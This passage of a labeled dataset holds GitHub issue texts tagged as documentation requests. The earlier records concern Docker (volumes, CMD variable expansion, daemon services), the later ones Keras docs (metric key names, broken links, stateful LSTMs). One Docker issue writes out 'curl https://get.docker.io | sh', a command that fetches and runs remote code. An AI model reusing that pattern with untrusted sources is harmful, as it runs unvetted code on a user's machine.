well.\n"},{"labels":["documentation",null],"text":"The `USER user` command in Dockerfiles does the equivalent of `su user -c command` for all future `RUN command` commands.\n\nI propose adding the `GROUP group` command, which would do the equivalent of `sg group -c command` for all future `RUN command` commands.\n\n`newgrp` is a command that works a lot like `su` without a `-c` command, and sets the gid for future commands in the shell, but due to the way docker works, this is cleared between each command in the Dockerfile, so something like the following does _NOT_ work:\n\n```\nUSER user\nnewgrp group\n```\n\nInstead, my hope would be to be able to do something like:\n\n```\nUSER user\nGROUP group\n```\n"},{"labels":["documentation",null],"text":"https://docs.docker.com/examples/running_riak_service/\n\nhttp://jpetazzo.github.io/2014/06/23/docker-ssh-considered-evil/\n"},{"labels":["documentation",null],"text":"This page http://docs.docker.com/docker-hub/accounts/#organizations-groups should have more information about groups and how groups work with orgs. It should also have more information about roles of groups (read, write, admin) and what the permissions are for each group. I believe they are proper subsets of each other (admin ( write ( read ))) but I don't see that documented anywhere.\n"},{"labels":["documentation",null,null],"text":"When using volumes, the usefullness of the volume is limited without coupling it with a data-container.\nThe reason for this is the tie between a container and the volume... when the container goes away so does the possibility of actually using the data in that volume again, unless you'd happened to copy the host path of that volume.\n\n**Sumary**: referencing a volume is impossible when last container is removed\n\n**Proposed Solution**: Provide volume management API/UI.  This has started to be implemented in #8484\n"},{"labels":["documentation",null],"text":"which is a bit of a shame\n"},{"labels":["documentation",null],"text":"Operators need to know where the data in \"volumes\" is stored on the host so that they can monitor size, perform backups, migrate data, etc.\n\nHere is one way to dump the bindmounts on a container:\n\n```\n# Create a test container with volumes\n$ docker run --name testvol -v /vol-anon -v /tmp/vol:/vol-named ubuntu true\n\n# Ok, let's see where those volumes went...\n$ docker inspect --format={{.Volumes}} testvol\nmap[/vol-anon:/var/lib/docker/vfs/dir/1ed44639019c10269718628da26d792857c01dc0d383169841855db83c2d6904 /vol-named:/tmp/vol]\n```\n\nI think this would be a helpful addition to http://docs.docker.io/use/working_with_volumes/\n"},{"labels":["documentation",null,null],"text":"The `docker cp` command can currently copy a file from the container to the host. It should also be able to do the reverse.\n\nPing @crosbymichael \n"},{"labels":["documentation",null],"text":"We currently prefix commands with `#` or `$`. We should either:\n1. replace this/remove these.\n2. Have some JS magic so people who select commands in highlight boxes don't get the prefix.\n"},{"labels":["documentation",null],"text":"(on a just installed 14.04)\n\ncurl https://get.docker.io | sh\nsudo apt-get install docker.io\n\n(the second removes our package, and installs the ubuntu one)\n\nleaves us with `service --status-all` listing 2 services: `docker` and `docker.io`\n\nwhich makes me think our lxc-docker package is not cleaning up quite well enough.\n\nrebooting at this point leaves us with a happily working Docker 0.9.1\n\nthen `ln -s /usr/bin/docker.io /usr/bin/docker` and rebooting causes things to go bad.\n\non my system, there is only one docker daemon running, but its un-contactable.\n\n`service docker stop` does nothing, as its not running\n`service docker.io stop` stops the rogue daemon, and then \n`service docker.io start` makes everything happy again.\n\nsimilarly, after stopping which ever service is  running, \n`service docker start` works.\n\nso its probably _just_ something that happens if you start 2 daemons at almost the same time.\n"},{"labels":["documentation",null],"text":"Surely it should read \"--no-trunc=true: Don't truncate output\" or \"--no-trunc=false: Truncate output (default behaviour)\".\n\nSimilar for \"--quiet=false\".  I presume it was intended to show the alternatives (either \"-q\" or \"--quiet=false\"), however the textual description is misleading.\n\nI think a better format would be  \"-q, --quiet=<true|false>: whether to only display numeric IDs\", or something along those lines.\n\n```\nanni@helium:~/src/Redis$ docker ps -h\n\nUsage: docker ps [OPTIONS]\n\nList containers\n\n  -a, --all=false: Show all containers. Only running containers are shown by default.\n  --before=\"\": Show only container created before Id or Name, include non-running ones.\n  -l, --latest=false: Show only the latest created container, include non-running ones.\n  -n=-1: Show n last created containers, include non-running ones.\n  --no-trunc=false: Don't truncate output\n  -q, --quiet=false: Only display numeric IDs\n  -s, --size=false: Display sizes\n  --since=\"\": Show only containers created since Id or Name, include non-running ones.\nanni@helium:~/src/Redis$\nanni@helium:~/src/Redis$ docker version\nClient version: 0.10.0\nClient API version: 1.10\nGo version (client): go1.2.1\nGit commit (client): dc9c28f\nServer version: 0.10.0\nServer API version: 1.10\nGit commit (server): dc9c28f\nGo version (server): go1.2.1\nLast stable version: 0.10.0\nanni@helium:~/src/Redis$\n```\n"},{"labels":[null,"documentation"],"text":"Similar to #1136.\n\nI want to be able to say `CMD [ \"$CATALINA_HOME/bin/catalina.sh\", \"run\"]`\n"},{"labels":["documentation",null],"text":"When there is nothing to show in TOC, maybe we could hide it or display the main title?\n\nExample on contribution:\n![screen shot 2014-04-17 at 3 56 00 pm](https://cloud.githubusercontent.com/assets/521701/2737901/8a524fe0-c683-11e3-89a3-1fa97a2726d4.png)\n\n/cc @SvenDowideit @ostezer @jamtur01 \n"},{"labels":["documentation",null],"text":"While `docker logs` is extremely useful for inspecting containers, [the documentation gives no hints as to how it should be handled operationally](http://docs.docker.io/en/latest/reference/commandline/cli/#logs).\n\nOutstanding questions include:\n- Where are logs stored (or are they an inmemory ring buffer like dmesg)?\n- If they are stored, how are they rotated so they don't grow without bound?\n- Is it a best practice for daemons running in containers to _not_ using `std{out,err}` for logging (and instead use the host's syslog, a log file in a mounted voulme, a remote daemon, etc.)?\n\nAs per guidelines for contribution:\n\n```\nClient version: 0.9.1\nGo version (client): go1.2.1\nGit commit (client): 3600720\nServer version: 0.9.1\nGit commit (server): 3600720\nGo version (server): go1.2.1\nLast stable version: 0.9.1\n\nContainers: 3\nImages: 47\nStorage Driver: aufs\n Root Dir: /var/lib/docker/aufs\n Dirs: 57\nExecution Driver: native-0.1\nKernel Version: 3.11.0-18-generic\nWARNING: No swap limit support\n```\n\nI tried searching existing issues for duplicates, but logging is a very difficult thing to search on. Please feel free to close if this is a dupe.\n"},{"labels":[null,"documentation"],"text":"http://docs.docker.io/en/latest/reference/api/docker_remote_api_v1.10/#tag-an-image-into-a-repository\n\nDoesn't describe how to set the tag on the image...just allows you to provide the image repo.\n"},{"labels":["documentation",null,null],"text":"I was using the following\n\nENV MYPATH /usr/local/myPath\nCMD [ \"ls\", \"-la\", \"$MYPATH\"]\n\nand I get \nls: cannot access $MYPATH: No such file or directory\n\nBut, if I used the other format\nCMD ls -la $MYPATH\n\nthen the listing is correct.\n\nCMD [ \"ls\", \"-la\", $NMMHOME ] simply doesn't work\n\nNow I also was trying something like this.\n\nENTRYPOINT [ \"$MYPATH/start.sh\"]\n\ndoesn't work. Some problem : unable to locate $MYPATH/start.sh\n\nBut similarly to CMD 'shell version'\n\nENTRYPOINT $MYPATH/start.sh\n\nworks fine.\n\nAlso the start.sh is referencing the $MYPATH as well and it sees the correct value.\n\nSo I think there is still a bug in specifying the environment variables within the CMD / ENTRYPOINT commands when using the exec like way (preferred method)\n"},{"labels":["documentation",null],"text":"If you try to use a root that's mounted with \"nodev\", \"nosuid\", or \"noexec\", you'll have some pretty big problems with your containers (obviously).\n\nIn my case, I was trying to use a btrfs directory that was mounted via udisks2 inside my GUI file manager, but hadn't noticed that it was mounted with \"nodev\".  Once I ran a container, I couldn't do things like `apt-get install` because they tried to write to \"/dev/null\" which was on a nodev filesystem so obviously wouldn't work.\n\nWhat I'd propose is that any of these problematic mount options become a warning at daemon startup.\n"},{"labels":["documentation",null,null],"text":"Better than using an \"allow insecure ssl\" option,  it is far more preferable and secure to advise users to manage their local CAs through their OS' certificate bundle.\n\nThe behavior used by Docker is inherited from golang's crypto/x509 package (see: http://golang.org/src/pkg/crypto/x509/)\n\nIn short, each OS has a different file (or multiple files) that container CA bundles. These files are, according to the x509 package:\n\n```\nUbuntu/Debian - \"/etc/ssl/certs/ca-certificates.crt\",\nFedora/RHEL - \"/etc/pki/tls/certs/ca-bundle.crt\",\nOpenSUSE - \"/etc/ssl/ca-bundle.pem\",\nOpenBSD - \"/etc/ssl/cert.pem\",\nMacOS - KeyChain\nWindows - http://support.microsoft.com/kb/295663\n```\n\nDocumentation should explain why it is better to update these files (rather than ignore certificates) and provide guidance on establishing a proper and secure configuration.\n"},{"labels":[null,"documentation"],"text":"What invalidates a cache?\nWhat _looks_ like it is doing something new but actually uses the cache? (eg RUN apt-get...)\n"},{"labels":["documentation",null,null],"text":"Each init system has a slightly different way to setup the \"default flags\" for the Docker daemon.  For example, OpenRC (Gentoo) uses \"/etc/conf.d/docker\", while Upstart/SysV (Ubuntu/Debian) uses \"/etc/default/docker\", and systemd prefers you copy the unit scripts.\n\nThis need is prompted by getting now two separate PRs to add a \"configuration file\" for the systemd unit file from people looking to just modify the daemon startup arguments (which upstream systemd does not recommend doing, as described well in those threads): #3307 and #3627.  There are some good links and good suggestions in each that ought to be added to a section somewhere, and I'd propose it just be a general section about \"Configuring Daemon Startup Flags\" or something like that, and leave it as an exercise to the reader to figure out which system they're using, perhaps also mentioning the most common system for our supported platform (Ubuntu), and any others that are similarly obvious (like OpenRC being for Gentoo), where for systemd, all bets are off on which distro (since it's available in so many as an option or even as the default).\n"},{"labels":["documentation",null],"text":"a few weeks ago i was shooting the breeze on irc about how to use VOLUMEs, wrt to backup, migration and general portability.\n\nafter writing up the linking example for ambassador pattern, it became clear that what I'd described was pretty much the same thing, just for VOLUMEs\n\nie, to backup VOLUMEs on one container\n\n`(volume container) --> (backup container which writes to wherever)`\n\nand to migrate from one docker host to another (ok, to be totally magic, it would require `dind` to also create the other services containers...\n\n`(volume container) --> (backup) ---network---> (restore) --> (new volume container)`\n\nsimilarly, you could do live syncing, or even bi-directional syncing\n\n`(volume container) --> (rsync) ---network---> (rsync) --> (backup volume container)`\n\nand like in the linking example, the data service can be just that, and the backup, sync or spying containers can be changed out as requirements change.\n\nalso, from irc @shykes was mentioning \n\n```\n<shykes_> so you could do 'docker run -volumes-from=prod_data ubuntu tar -C /var/lib/postgres -c . | ssh $IP_OF_OTHER_CONTAINER tar -C /var/lib/postgres -x'\n<shykes_> or more precisely\n<shykes_> docker run -volumes-from=prod_data ubuntu sh -c \"tar -C /var/lib/postgres -c . | ssh $IP_OF_OTHER_CONTAINER tar -C /var/lib/postgres -x'\"\n```\n\nI'm going to try to write this in the next days - though tomorrow isn't likely :)\n\n<div class=\"discussion-labels\">...</div>\n"},{"labels":[null,"documentation"],"text":"I'm trying to use the docker remote API to build images/containers, referring to the document:  http://docs.docker.io/en/latest/api/docker_remote_api_v1.7/\n\nI was unable to find information on  \"ExposedPorts\" for creating a container and \"PortBindings\" for starting a container.\n\nThere is no such parameter \"ExposedPorts\" for the creating a container and\nthere is no parameter \"PortBindings\" for starting a container.\n"},{"labels":["documentation",null],"text":"I suggest that the REST API documentation be moved to a more machine readable format such as JSON, XML, or the new blueprint format (http://apiblueprint.org)\n\nThe reason is simple... The community maintained modules and libs are currently updated by hand and not always in sync with Dockers many and frequent changes. Having a format that can be used as a config or even used to compile new releases would drastically speed up the communities ability to utilize the latest versions of docker.\n"},{"labels":["documentation",null],"text":"I thought it may be useful to start a document about how to debug a docker binary once you've built it, The document would sit under the docs/soruces/contributing directory.\n\nWhat do others think?\n"},{"labels":["documentation",null,null,null,null],"text":"I've narrowed down a problem in an originally more involved setup. Consider the following Dockerfile:\n\n```\n# Dockerfile\nFROM      ubuntu:12.10\n\nRUN apt-get install -y puppetmaster sudo\n\nRUN rm -rf /etc/puppet\nADD puppet-config /etc/puppet\nRUN chown -R puppet.puppet /etc/puppet\nRUN chmod 755 /etc/puppet\n```\n\nWhen run with the following:\n\n```\n# make a dummy directory\nmkdir puppet-config\necho \"hi\" >puppet-config/hello.txt\n\ndocker build -t dockbug .\n\necho \"note the directory is owned by puppet with full read/write/execute privs\"\ndocker run dockbug ls -al /etc/puppet\n\necho \"but we get a permission error here\"\ndocker run dockbug sudo -u puppet ls -al /etc/puppet\n```\n\nI see an unexpected permission error in the final command. This is with Docker 0.3.4 from the PPA on Ubuntu 13.04 with kernel 3.8.0-19-generic. Interestingly, if I remove the like \"RUN rm -rf /etc/puppet\" from the Dockerfile, I no longer see the permission error.\n"},{"labels":["documentation",null,null,null],"text":"**Summary**: The documentation does not explain what `docker run` does under the hood.\n\n**Proposed solution**: Add documentation to explain in reasonable detail what `docker run` does.\n\nSome useful links:\n- https://docs.docker.com/reference/commandline/cli/#run\n- https://docs.docker.com/reference/commandline/cli/#create\n- https://docs.docker.com/reference/commandline/cli/#start\n- https://github.com/docker/docker/blob/master/image/spec/v1.md\n- https://github.com/docker/libcontainer/blob/master/SPEC.md\n# \n\n**Original comment**:\nI think it would make a good addition to the documentation to explain what exactly happens when a user issues `docker run`\n"},{"labels":[null,"documentation"],"text":"Using the built-in Attention layer shows 0 trainable parameters. Is this just a summary bug? Or does the Attention layer not implement the Q and K matrix calculations? The recently updated documentation is still completely ambiguous.\r\n\r\n![Screenshot_20200608-082722](https://user-images.githubusercontent.com/44982143/84050864-2a9cd880-a963-11ea-80a5-e9182bac65cc.png)\r\n"},{"labels":["documentation"],"text":"**System information**  \r\n- nothing is applicable except:\r\n   - Keras version: 2.3.1\r\n\r\n**Describe the current behavior**  \r\n\r\nThe behavior of the `Concatenate` layer with respect to masks on its inputs [is not documented](https://keras.io/api/layers/merging_layers/concatenate/).  \r\n\r\n**Describe the expected behavior**  \r\n\r\nIt ought to be documented. If I am reading [the code](https://github.com/keras-team/keras/blob/7a39b6c62d43c25472b2c2476bd2a8983ae4f682/keras/layers/merge.py#L406) correctly, the behavior is what you would hope it is: a position is masked out if it is masked out in any of the entries along the final axis of the concatenation result.  However, it would be nice not to need to check the source to confirm this. :-)\r\n\r\nMore generally, it would be useful if behavior with respect to masking were a standard part of layer documentation (especially when it is not trivial)\r\n\r\n**Code to reproduce the issue**  \r\nn/a\r\n\r\n**Other info / logs**  \r\nn/a"},{"labels":[null,"documentation"],"text":"**System information**  \r\n- Have I written custom code (as opposed to using example directory):  No (subclassing callbacks)\r\n- OS Platform and Distribution (e.g., Linux Ubuntu 16.04):  Linux Ubuntu 18.04\r\n- TensorFlow backend (yes / no):  YES\r\n- TensorFlow version:  2.1.0\r\n- Keras version:  2.2.4-tf\r\n- Python version:  3.6.10\r\n- CUDA/cuDNN version:  \r\n- GPU model and memory:  \r\n\r\n**Describe the current behavior**  \r\nThe documentation at [Keras Callbacks](https://keras.io/callbacks/) says \r\n> on_epoch_end: logs include acc and loss, and optionally include val_loss\r\n\r\nHowever, '_acc_' throws an error, it seems to be only '_accuracy_'. If you\r\n```\r\nprint(list(logs))\r\n```\r\nIt gives:\r\n```\r\n['loss', 'accuracy']\r\n```\r\n**Describe the expected behavior**  \r\n\r\nDocumentation should say _accuracy_, not _acc_\r\n\r\n**Code to reproduce the issue**  \r\n```\r\nimport os\r\nos.environ['TF_CPP_MIN_LOG_LEVEL'] = '3'\r\nimport tensorflow as tf\r\nfrom sklearn.datasets import make_blobs\r\nfrom tensorflow.keras.layers import Dense\r\nfrom tensorflow.keras import Model, Input\r\nfrom tensorflow.keras.callbacks import Callback\r\n\r\nX, y = make_blobs(n_features=10,\r\n                  n_samples=5000,\r\n                  cluster_std=1.5,\r\n                  centers=5)\r\n\r\n\r\ninputs = Input(shape=(10,))\r\n\r\nx = Dense(8, activation='selu', kernel_initializer='lecun_normal')(inputs)\r\nx = Dense(16, activation='elu', kernel_initializer='he_normal')(x)\r\noutputs = Dense(5, activation='softmax')(x)\r\n\r\nMyModel = Model(inputs=[inputs], outputs=[outputs])\r\n\r\n\r\nclass CustomCallback(Callback):\r\n    def on_epoch_end(self, epoch, logs=None):\r\n        print(list(logs))\r\n        if logs.get('acc') > 9e-1:\r\n            print('\\nAccuracy above 80%, interrupting training.')\r\n            self.model.stop_training = True\r\n\r\n\r\nMyModel.compile(loss='sparse_categorical_crossentropy', \r\n    optimizer='sgd', metrics=['accuracy'])\r\n\r\nhistory = MyModel.fit(X, y, callbacks=[CustomCallback()], epochs=20)\r\n```\r\n>TypeError: '>' not supported between instances of 'NoneType' and 'float'\r\n\r\nWhen getting the documentation in `ipython` for `tensorflow.keras.callbacks.Callback`:\r\n```\r\n    on_epoch_end: logs include `acc` and `loss`, and\r\n        optionally include `val_loss`\r\n        (if validation is enabled in `fit`), and `val_acc`\r\n        (if validation and accuracy monitoring are enabled).\r\n```"},{"labels":["documentation"],"text":"In Keras documentation, glorot_uniform says that the initializer is using Glorot Uniform from [this paper](http://proceedings.mlr.press/v9/glorot10a/glorot10a.pdf). However, the Keras implementation is totally different from the equation on the paper. Also, there are some arguments such as mode ='fan_avg' is the default. It should be same as the referenced paper. 'fan_sum'. Golort uniform is shown in Equation 1, but Keras implementation is shown in Equation 2. I had hard time to produce the same or close results to Keras using Pytorch. \r\n![Screen Shot 2020-04-23 at 9 44 11 AM](https://user-images.githubusercontent.com/23180823/80107996-ce642d80-8549-11ea-9bc9-a45262ac1f60.png)\r\n\r\n`def __call__(self, shape, dtype=None):\r\n        fan_in, fan_out = _compute_fans(shape)\r\n        scale = self.scale\r\n        if self.mode == 'fan_in':\r\n            scale /= max(1., fan_in)\r\n        elif self.mode == 'fan_out':\r\n            scale /= max(1., fan_out)\r\n        else:\r\n            scale /= max(1., float(fan_in + fan_out) / 2)\r\n        if self.distribution == 'normal':\r\n            # 0.879... = scipy.stats.truncnorm.std(a=-2, b=2, loc=0., scale=1.)\r\n            stddev = np.sqrt(scale) / .87962566103423978\r\n            x = K.truncated_normal(shape, 0., stddev,\r\n                                   dtype=dtype, seed=self.seed)\r\n        else:\r\n            limit = np.sqrt(3. * scale)\r\n            x = K.random_uniform(shape, -limit, limit,\r\n                                 dtype=dtype, seed=self.seed)\r\n        if self.seed is not None:\r\n            self.seed += 1\r\n        return x`\r\n"},{"labels":["documentation"],"text":"1. Make possible to make link to paragraph, i.e. in https://keras.io/layers/recurrent/ we have LSTM paragraph, but I can't get link directly to it. For example like in pytorch docs https://pytorch.org/docs/stable/nn.html#lstm\r\n\r\n2. Link to source becomes outdated, i.e. https://github.com/keras-team/keras/blob/master/keras/layers/recurrent.py#L2081 source code is changed and this line is no longer points to relevant class definition.\r\n"},{"labels":[null,"documentation",null],"text":"Referring to closed log #11690. \r\n(Updating keras to support python 3.7)\r\n\r\nNote that Python 3.8 is now out. \r\n\r\nThe previous log noted that TensorFlow did not yet support python 3.7.\r\n\r\nI note now that TensorFlow DOES support 3.7 (under project details)  : \r\nhttps://pypi.org/project/tensorflow/#data\r\n\r\nSurely other AI backends currently supported by Keras which are no longer maintained need to be dropped, or need to be documented as restricted to older versions of Keras. "},{"labels":[null,"documentation"],"text":"<em>Please make sure that this is a Bug or a Feature Request and provide all applicable information asked by the template.\r\nIf your issue is an **implementation question**, please ask your question on [StackOverflow](http://stackoverflow.com/questions/tagged/keras) or [on the Keras Slack channel](https://keras-slack-autojoin.herokuapp.com/) instead of opening a GitHub issue.</em>  \r\n\r\n**System information**  \r\n- Have I written custom code (as opposed to using example directory):  unrelated\r\n- OS Platform and Distribution (e.g., Linux Ubuntu 16.04):  unrelated\r\n- TensorFlow backend (yes / no):  \r\n- TensorFlow version:  unrelated\r\n- Keras version:  unrelated\r\n- Python version:  unrelated\r\n- CUDA/cuDNN version:  unrelated\r\n- GPU model and memory:  unrelated\r\n\r\n<!-- You can obtain the TensorFlow version with:  \r\npython -c \"import tensorflow as tf; print(tf.GIT_VERSION, tf.VERSION)\"  \r\nYou can obtain the Keras version with:  \r\npython -c 'import keras as k; print(k.__version__)'  -->\r\n\r\n**Describe the current behavior**  \r\n\r\nStarted from the \"Convolutional autoencoder\" section, tutorial on the page <https://blog.keras.io/building-autoencoders-in-keras.html> has some mistake about `plt` usage. The code is shown below.\r\n\r\n**Describe the expected behavior**  \r\n\r\nThe usage of `plt` should be correct considering many learners might get frustrated when they imitated the code and got some unexpected errors.\r\n\r\n**Code to reproduce the issue**  \r\nProvide a reproducible test case that is the bare minimum necessary to generate the problem.  \r\n\r\n```python\r\ndecoded_imgs = autoencoder.predict(x_test)\r\n\r\nn = 10\r\nplt.figure(figsize=(20, 4))\r\nfor i in range(n):\r\n    # display original\r\n    ax = plt.subplot(2, n, i)\r\n    plt.imshow(x_test[i].reshape(28, 28))\r\n    plt.gray()\r\n    ax.get_xaxis().set_visible(False)\r\n    ax.get_yaxis().set_visible(False)\r\n\r\n    # display reconstruction\r\n    ax = plt.subplot(2, n, i + n)\r\n    plt.imshow(decoded_imgs[i].reshape(28, 28))\r\n    plt.gray()\r\n    ax.get_xaxis().set_visible(False)\r\n    ax.get_yaxis().set_visible(False)\r\nplt.show()\r\n```\r\n\r\nFocus on this code\r\n\r\n```python\r\nplt.subplot(2, n, i)\r\n```\r\n\r\nUnless `i` is started from `1`, this expression is not correct.\r\n\r\n**Other info / logs**  \r\nInclude any logs or source code that would be helpful to diagnose the problem. If including tracebacks, please include the full traceback. Large logs and files should be attached.  \r\n\r\nunrelated\r\n"},{"labels":["documentation"],"text":"In the [documentation](https://keras.io/layers/embeddings/) it says:\r\n\r\n> Turns positive integers (indexes) into dense vectors of fixed size. eg. [[4], [20]] -> [[0.25, 0.1], [0.6, -0.2]]\r\n\r\nNeither this explanation nor this example is very clear. I would suggest replacing this with\r\n> Turns positive integers (indexes) into dense vectors of fixed size. eg. [[4], [20]] -> [[0.25, 0.1], [0.6, -0.2]] if weights[4] is [0.25, 0.1] and weights[20] is [0.6, -0.2]. Note that float inputs get casted to an integer instead of rounded to the nearest integer."},{"labels":["documentation"],"text":"I was going through the docs in \r\n> examples/README.md\r\n\r\nand many of the links there are broken which would cause problem to the people are new and don't know about the scripts.\r\n\r\nI would like to help on this :))\r\n\r\n"},{"labels":["documentation"],"text":"Steps:\r\n\r\n1. Go to a nonexistent page in Keras docs, e.g. https://keras.io/asdfsada so the 404 page is shown\r\n2. Search something\r\n3. You are redirected to https://search.html/?q=something instead of a relative URL"},{"labels":["documentation"],"text":"Please implement the latest examples in the [examples/ folder](https://github.com/keras-team/keras/tree/master/examples) to the [docs/mkdocs.yml](https://github.com/keras-team/keras/blob/master/docs/mkdocs.yml) to see theses examples on the homepage. Perhaps a subsectioning for that many examples is necessary. See [Homepage](https://keras.io/)\r\n\r\nThank you!"},{"labels":["documentation"],"text":"This readme links to tensorboard_embeddings_mnist.py which doesn't exist. Where did it go?\r\nhttps://github.com/keras-team/keras/blob/master/examples/README.md"},{"labels":["documentation"],"text":"Some lines in the **_code_** block of the keras docs is too long, the result of which is, there will be a horizonal scroll bar at the bottom of the **_code_** block. That is hard to read. The long lines should be rearranged to multiple short lines to improve readibility.\r\n\r\nExample:\r\nThe docs for the SimpleRNN class (https://keras.io/layers/recurrent/#simplernn). The initializer of SimpleRNN has many arguments, but the docs put them in just a single long line. That makes it very hard to read. \r\n![docs line too long](https://user-images.githubusercontent.com/1805467/72451447-ea438f00-37f6-11ea-859b-d5427e444239.JPG)\r\n\r\nThe single long line should be rearranged to multiple short lines, just like what was did in the source code for the __init__ function of SimpleRNN.\r\n\r\n![short lines](https://user-images.githubusercontent.com/1805467/72451555-119a5c00-37f7-11ea-8a41-811d29b52208.JPG)\r\n\r\n"},{"labels":["documentation"],"text":"As indicated in the [FAQ](https://github.com/keras-team/keras/blob/master/docs/templates/getting-started/faq.md), the way to import ResNeXt101 is `from keras.applications.resnext import ResNeXt101`. But in the latest Keras 2.3.1 and Keras-Applications 1.0.8, it gives `ImportError: No module named 'keras.applications.resnext'`. I try to change it to `from keras_applications.resnext import preprocess_input, ResNeXt101`, then it gives the error\r\n ```  \r\nFile \"/usr/local/lib/python3.5/dist-packages/keras_applications/resnet_common.py\", line 575, in ResNeXt101\r\n    **kwargs)\r\n  File \"/usr/local/lib/python3.5/dist-packages/keras_applications/resnet_common.py\", line 348, in ResNet\r\n    data_format=backend.image_data_format(),\r\nAttributeError: 'NoneType' object has no attribute 'image_data_format'\r\n```\r\nAfter some Google search, I changed the code into: `base_model = ResNeXt101(input_shape=(\r\n    224, 224, 3), weights='imagenet', include_top=False,backend = keras.backend, layers = keras.layers, models = keras.models, utils = keras.utils)`. It successfully load the model and weights. But when I try to import the `preprocess_input` from `keras_applications.resnext`, I got the similar `AttributeError: 'NoneType' object has no attribute 'image_data_format'`. So I try to apply the same fix to it by wrapping the `preprocess_input` like this:\r\n```\r\ndef _preprocess_input(x):\r\n    preprocess_input(x,backend = keras.backend, layers = keras.layers, models = keras.models, utils = keras.utils)\r\n```\r\nIt fixes the error but results in nan of my training loss. I have to import the preprocess from other models `from keras.applications.resnet import preprocess_input`. Now my training script is running and the loss is decreasing normally. But I think the documentation should be updated so that it won't confuse other people."},{"labels":["documentation"],"text":"https://github.com/keras-team/keras/blob/master/keras/engine/training.py#L1071-L1077\r\nThere are two `validation_steps`."},{"labels":["documentation"],"text":"In the given [documentation](https://keras.io/visualization/), the mentioned key are `acc` and `val_acc`, but actually it is `accuracy` and `val_accuracy`.\r\n\r\nGiven documentation screenshot:\r\n![Screenshot from 2019-12-11 15-05-42](https://user-images.githubusercontent.com/9383897/70609796-70811a00-1c28-11ea-9ff5-29fcad5b2065.png)\r\n\r\nWhereas the actual keys are `dict_keys(['val_loss', 'val_accuracy', 'loss', 'accuracy'])`\r\n\r\nChanges to be made in [this](https://github.com/keras-team/keras/blob/master/docs/templates/visualization.md) file. "},{"labels":["documentation"],"text":"Small thing, but costed me several hours to find :)\r\nIn the documentation example of [Siamese mnist ](https://keras.io/examples/mnist_siamese/) .\r\n\r\nWe see a code for contrastive loss, based on a [paper](http://yann.lecun.com/exdb/publis/pdf/hadsell-chopra-lecun-06.pdf). But the labels in this function are reversed from \r\nthe paper. Meaning in the paper Y=0 if X1,X2 are from same domain, Y=1 otherwise. In the code example in the documentation it is reversed.\r\n\r\nThe code example quote the paper, so I thought it might be confusing :)\r\n\r\nMy suggestion is to change the function to match the paper, and also change the code to use the reverse labels (reverse the 0 and 1)."},{"labels":["documentation"],"text":"Is it a known issue (is it even an issue?) that model.test_on_batch returns the sum of losses of each entry in the batch instead of the average? I looked over the changelog and saw no reference to that.\r\nmodel.train_on_batch does in fact returns the average, but in the docs their return value is documented the same."},{"labels":["documentation"],"text":"I could not find anything in the docs about how to handle different frequencies of time series. I have a Dataset A with monthly data that i want to use to predict the values from Dataset B that contains quarterly based data. So the target value e.g. quarter 1 is based on the values from month 1-3.\r\n\r\nDataset A (Features):\r\n\r\n| Month  | Value1 | Value2 | Value3 |\r\n| ------------- | ------------- | ------------- | ------------- |\r\n| 1  | 91  | 72 | 23 |\r\n| 2  | 93  | 68 | 33 |\r\n| 3  | 92  | 57 | 27 |\r\n| 4  | 91  | 72 | 23 |\r\n| 5  | 93  | 68 | 33 |\r\n| 6  | 92  | 57 | 27 |\r\n\r\nDataset B (Target):\r\n\r\n| Quarter   | Target_Value |\r\n| ------------- | ------------- |\r\n| 1  | 51  |\r\n| 2  | 57  |"},{"labels":["documentation"],"text":"There's a small mistake in the description of the embedding layer. It says\r\n\r\n'Turns positive integers (indexes) into dense vectors of fixed size.'\r\n\r\nbut it should read\r\n\r\n'Turns non-negative integers (indexes) into dense vectors of fixed size.'\r\n\r\nas it expects indexes ranging from 0 to input_dim - 1.\r\n\r\nSee https://keras.io/layers/embeddings/"},{"labels":["documentation"],"text":"Proposing to bundle [Caltech-101 dataset](http://www.vision.caltech.edu/Image_Datasets/Caltech101/) in the next release of Keras (or any future release) as a standard dataset for image-related application tasks.\r\n\r\nIt is small (compared to the whole ImageNet) but more difficult and challenging to train and experiment on than MNIST or CIFAR-10.\r\n\r\nIt was the precursor to Dr. Fei Fei Li's ImageNet program anyway and is nicely organized.\r\n\r\n"},{"labels":["documentation"],"text":"The topic given in the header was discussed for Keras for Python under [(https://github.com/keras-team/keras/issues/2030)], issue closed in the meantime.  \r\n\r\nUsing Keras for R with a Functional API*) I am observing a similar problem which I can't resolve using the advice given above, since the cases refer to Keras for Python and are (for me) not easily transferred to Keras for R. In my case, the output (outpt1=400) after a convolutional layer is reshaped to `outpt1=c(1,400)`, concatenated with two additional inputs `(inpt2=c(1, 6)`, `inpt3=c(1, 6)` to produce a shape (1,412) and this is fed to the first LSTM of a 3-layer LSTM stack, see the following essential lines of code:\r\n\r\n```\r\noutpt1 <- ... \r\nlayer_reshape(target_shape=c(1,4*5*20), name='resh1')\r\n```\r\n```\r\noutpt4 <- layer_concatenate(c(inpt2, inpt3, outpt1)) %>%\r\nlayer_lstm(units = 40,\r\n       return_sequences = T,\r\n       stateful = T,\r\n       name = 'lstm1') %>%\r\n...\r\n```\r\n\r\nWithout the line `stateful = T` the code is working correctly (it only requires an additional reshape just after the concatenation to give shape (412), though). Inserting the line `stateful = T` produces the  following error message:\r\n\r\n```\r\nError in py_call_impl(callable, dots$args, dots$keywords) : \r\nValueError: If a RNN is stateful, it needs to know its batch size. \r\nSpecify the batch size of your input tensors: \r\nIf using a Sequential model, specify the batch size by passing a \r\n`batch_input_shape` argument to your first layer.\r\nIf using the functional API, specify the batch size by passing a \r\n`batch_shape` argument to your Input layer. \r\n```\r\n\r\nDoing as required for the case Functional API, it rejects the `batch_shape = c(Bs,1,412)` argument (with Bs=40) with the following message:\r\n\r\n```\r\nError in layer_lstm(., units = 40, batch_shape = c(Bs, 1, 412), activation = \"tanh\",  :\r\nunused argument (batch_shape = c(Bs, 1, 412))\r\n\r\n```\r\nUsing the command slightly modified to `batch_shape = c(1, 412)` produces the message\r\n\r\n```\r\nError in layer_lstm(., units = 40, batch_shape = c(1, 412), activation = \"tanh\", \r\nunused argument (batch_shape = c(1, 412))\r\n\r\n```\r\nThus, the command is rejected because it is not recognized at all. Using the command  `batch_input_shape = c(1, 412)` or `batch_input_shape = c(Bs, 1, 412)` as recommended in the documentation, produces exactly the same results. Obviously, the error message is clearly misleading. Moreover, the documentation does not mention any peculiarities regarding either Keras Functional API or Keras Sequential Model. \r\n\r\nSince this problem seems to exist for quite a long time by now (it was raised in early 2016 for the first time) - could somebody comment on this problem or perhaps provide some helpful suggestions?\r\n\r\n*) my SW 